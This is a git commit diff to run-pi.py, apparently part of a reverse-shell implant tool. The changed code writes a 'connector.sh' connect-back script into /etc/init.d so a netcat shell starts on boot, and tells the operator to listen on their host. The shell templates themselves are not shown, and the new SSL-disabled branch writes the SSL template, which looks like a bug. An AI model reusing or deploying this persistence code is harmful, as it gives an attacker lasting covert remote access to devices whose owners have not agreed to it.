6a892dc3da6e4788cea4e97d8cd0051730415c4f
mhaskar <m.askar@isecur1ty.org>
2016-09-28 03:59:21 +0300

    Update run-pi.py

--- run-pi.py
+++ run-pi.py
@@ -40,21 +40,27 @@ if shell_type == "NC":  #add host and port to connect.sh to init.d
 	 f = open("/etc/init.d/connector.sh","w")
 	 f.write(sh_template)
 	 f.close()
-	 
+	 cprint("[+]setup done ! you can listen to your host now","blue")
   except:  
          cprint("[!]cannot add connector.sh","red")
-         cprint("[+]setup done ! you can listen to your host now","blue")	  	
- try:
+         sys.exit(0)	  	
+#########################################################################33
+ if ssl == False:
+  cprint("[+]SSL connection disabled","yellow")
+  time.sleep(1) 
+  cprint("[+]Adding NC auto connect script to init.d","green")
+  try:
 	 f = open("/etc/init.d/connector.sh","w")
-	 f.write(sh_template)
+	 f.write(sh_template_ssl)
 	 f.close()
- except:
-	 cprint("[!]cannot add connector.py","red")	 
- cprint("[+]setup done ! you can listen to your host now","blue")
+	 cprint("[+]setup done ! you can listen to your host now","blue")
+  except:  
+         cprint("[!]cannot add connector.sh","red")
+         sys.exit(0)	
+
 else:
  cprint("[!]cannot find shell type","red")
  #os.system("cp connect.py /etc/init.d/connect.py") #create pattern
  #os.system("cp connect.sh /etc/init.d/connect.sh") #copy script to init.d
 
 #if shell_type == "Meterpreter": #add host and port to connect.py to init.d
- 
